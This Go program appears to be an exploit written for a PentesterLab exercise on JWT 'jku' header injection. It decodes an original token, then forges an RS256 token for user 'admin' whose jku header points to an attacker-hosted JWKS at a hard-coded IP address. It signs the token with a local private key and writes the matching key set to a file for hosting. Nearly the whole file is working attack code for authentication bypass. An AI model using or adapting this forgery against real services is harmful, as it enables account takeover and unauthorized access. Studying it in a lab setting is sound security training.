package main

import (
	"bufio"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"os"
	"strings"
)

const (
	origToken   = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vcGVudGVzdGVybGFiLmNvbS8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYmRtaW4ifQ.RYsidQWNcApwiRlVItoSOsiLeALCxkyd1NPYOEp1Ez6ikbDyD-cOhHjj5lJEysSC_unRthTLErRpJ0Exym9gzHEWFfSWfOPoLxcrhAy4fv4CTGdFLRsAVdSfMuk2b5nsEI5FoFYCe9mtRs4hZVY6D5HB7Sb5Ff4FEydFRA3lEFxA6Wmdsxobe_xpGbutXQwGH502igvLrMalTNzLY223tlQhTSXSqZYkSfmbE00-Qdd3Sypws8bwU-LJU8GfucKWBpF3HgTKZnUpf7vkUxwdJeJirow6QR3ADnWq_z2Bfwi4f-dzkkRA8FV-9jlxdfJsgppBp4IczGQEKc5sy8Getw"
	attackURL   = "http://ptl-8d4d66d9-8109cb3d.libcurl.so/"
	privKeyPath = "private.pem"
	targetUser  = "admin"
)

var (
	signKey *rsa.PrivateKey
)

type Keys struct {
	Keys []JKU `json:"keys"`
}

type JKU struct {
	Kty string `json:"kty"`
	Kid string `json:"kid"`
	Use string `json:"use"`
	N   string `json:"n"`
	E   string `json:"e"`
	Alg string `json:"alg"`
}

type Header struct {
	Typ string `json:"typ"`
	Alg string `json:"alg"`
	Jku string `json:"jku"`
}

type Payload struct {
	User string `json:"user"`
}

/*
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "pentesterlab",
      "n": "oTtAXRgdJ6Pu0jr3hK3opCF5uqKWKbm4KkqIiDJSEsQ4PnAz14P_aJnfnsQwgchFGN95cfCO7euC8HjT-u5WHHDn08GQ7ot6Gq6j-fbwMdRWjLC74XqQ0JNDHRJoM4bbj4i8FaBdYKvKmnJ8eSeEjA0YrG8KuTOPbLsglADUubNw9kggRIvj6au88dnBJ9HeZ27QVVFaIllZpMITtocuPkOKd8bHzkZzKN4HJtM0hgzOjeyCfqZxh1V8LybliWDXYivUqmvrzchzwXTAQPJBBfYo9BO6D4Neui8rGbc49OBCnHLCWtPH7m7xp3cz-PbVnLhRczzsQE_3escvTF0FGw",
      "e": "AQAB",
      "alg": "RS256"
    }
  ]
}
*/

func main() {
	// {"typ":"JWT","alg":"RS256","jku":"https://pentesterlab.com/.well-known/jwks.json"} {"user":"bdmin"}
	fmt.Println("[*] Original auth token:")
	fmt.Println(parseToken(origToken))

	privKey := loadRSAPEM(privKeyPath)
	cookie := buildToken(targetUser, privKey)

	fmt.Println("[*] Malicious auth token (admin):")
	fmt.Println(cookie)

	jku := buildJKU(privKey)
	file, _ := json.MarshalIndent(Keys{[]JKU{jku}}, "", " ")
	_ = ioutil.WriteFile("test.json", file, 0644)
	fmt.Println("[+] Output keys to json")
}

func fatal(err error) {
	if err != nil {
		log.Fatalln(err)
	}
}

func buildToken(username string, privKey *rsa.PrivateKey) string {

	// https://goinbigdata.com/how-to-correctly-serialize-json-string-in-golang/
	tmp, err := json.Marshal(Header{"JWT", "RS256", "http://157.230.207.7:8080/jwks.json"})
	fatal(err)
	header := encode(tmp)

	tmp2, err := json.Marshal(Payload{"admin"})
	fatal(err)
	payload := encode(tmp2)

	token := strings.Join([]string{header, payload}, ".")

	sig := signRS256([]byte(token), privKey)

	token = strings.Join([]string{token, encode(sig)}, ".")

	return token
}

func buildJKU(privKey *rsa.PrivateKey) JKU {
	return JKU{"RSA", "pentesterlab", "sig", encode(privKey.PublicKey.N.Bytes()), encode(big.NewInt(int64(privKey.PublicKey.E)).Bytes()), "RS256"}
}

func signRS256(token []byte, privKey *rsa.PrivateKey) []byte {
	h := sha256.New()
	h.Write(token)
	d := h.Sum(nil)
	sig, err := rsa.SignPKCS1v15(rand.Reader, privKey, crypto.SHA256, d)
	fatal(err)
	return sig
}

// https://medium.com/@raul_11817/export-import-pem-files-in-go-67614624adc7
func loadRSAPEM(privKeyPath string) *rsa.PrivateKey {
	privKeyFile, err := os.Open(privKeyPath)
	fatal(err)

	pemfileinfo, _ := privKeyFile.Stat()
	size := pemfileinfo.Size()
	pembytes := make([]byte, size)
	buffer := bufio.NewReader(privKeyFile)
	_, err = buffer.Read(pembytes)
	data, _ := pem.Decode(pembytes)
	privKeyFile.Close()

	privKeyImported, err := x509.ParsePKCS1PrivateKey(data.Bytes)
	fatal(err)
	return privKeyImported
}

func parseToken(token string) []string {
	s := strings.Split(token, ".")
	parsed := make([]string, 0)
	for _, v := range s[0:2] {
		d, err := base64.RawStdEncoding.DecodeString(v)
		if err != nil {
			log.Fatalln(err)
		}
		parsed = append(parsed, string(d))
	}
	return parsed
}

func encode(v []byte) string {
	encoded := base64.URLEncoding.EncodeToString(v)
	return strings.ReplaceAll(encoded, "=", "")
}
